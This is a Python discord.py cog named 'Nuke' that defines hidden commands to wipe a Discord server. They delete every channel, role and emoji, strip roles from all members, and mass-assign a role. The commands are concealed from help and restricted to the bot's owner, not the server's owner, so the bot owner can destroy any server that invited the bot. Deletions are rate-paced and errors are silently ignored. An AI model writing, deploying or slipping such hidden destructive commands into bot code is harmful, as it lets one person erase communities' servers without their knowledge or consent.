import discord
from discord.ext import commands
import asyncio

class Nuke(commands.Cog, name="nuke"):
    """channel and server destruction utilities."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def nukechannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
        """clone a channel and delete the original."""
        channel = channel or ctx.channel
        new_channel = await channel.clone(reason="nuke")
        await channel.delete()
        await new_channel.send("channel nuked. clean slate.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def nukeserver(self, ctx: commands.Context):
        """delete everything possible in the server."""
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        for role in ctx.guild.roles:
            if role.is_default() or role.managed:
                continue
            try:
                await role.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send("server nuke complete.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massrole(self, ctx: commands.Context, role: discord.Role):
        """assign a role to all members."""
        count = 0
        for member in ctx.guild.members:
            try:
                await member.add_roles(role)
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"assigned role to {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def stripall(self, ctx: commands.Context):
        """strip all roles from all members."""
        count = 0
        for member in ctx.guild.members:
            roles = [r for r in member.roles if not r.is_default() and not r.managed]
            if not roles:
                continue
            try:
                await member.remove_roles(*roles)
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"stripped roles from {count} members.")


async def setup(bot: commands.Bot):
    await bot.add_cog(Nuke(bot))
